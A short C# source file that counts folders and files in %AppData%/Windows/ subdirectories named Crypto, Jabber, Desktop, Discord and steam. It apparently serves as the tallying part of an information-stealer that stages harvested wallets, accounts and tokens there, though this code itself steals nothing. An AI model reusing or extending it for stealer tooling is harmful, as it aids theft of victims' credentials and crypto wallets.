using System;
using System.IO;

namespace c0unt
{
    class count
    {
        public static int GetCrypto()
        {
            try
            {
                if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Windows/Crypto"))
                {
                    string[] dirs = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Windows/Crypto");
                    int cryptocount = dirs.Length;
                    return cryptocount;
                }
                else
                {
                    int cryptocount = 0;
                    return cryptocount;
                }


            }
            catch
            {
                return 0;

            }
        }
        public static int GetJabber()
        {
            try
            {
                if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Windows/Jabber"))
                {
                    string[] jdirs = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Windows/Jabber");
                    int jabbercount = jdirs.Length;
                    return jabbercount;
                }
                else
                {
                    int jabbercount = 0;
                    return jabbercount;
                }
            }
            catch
            {
                return 0;
            }

        }
        public static int GetDesktop()
        {
            try
            {
                if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Windows/Desktop"))
                {
                    string[] ddirs = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Windows/Desktop");
                    int desktopcount = ddirs.Length;
                    return desktopcount;
                }
                else
                {
                    int desktopcount = 0;
                    return desktopcount;
                }
            }
            catch
            {
                return 0;
            }
        }
        public static int GetDiscord()
        {
            try
            {
                if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Windows/Discord"))
                {
                    string[] discdirs = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Windows/Discord");
                    int discordcount = discdirs.Length;
                    return discordcount;
                }
                else
                {
                    int discordcount = 0;
                    return discordcount;
                }
            }
            catch
            {
                return 0;
            }
        }
        public static int GetSteam()
        {
            try
            {
                if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Windows/steam"))
                {
                    string[] sdirs = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Windows/steam");
                    int steamcount = sdirs.Length;
                    return steamcount;
                }
                else
                {
                    int steamcount = 0;
                    return steamcount;
                }
            }
            catch
            {
                return 0;
            }
        }

    }
}
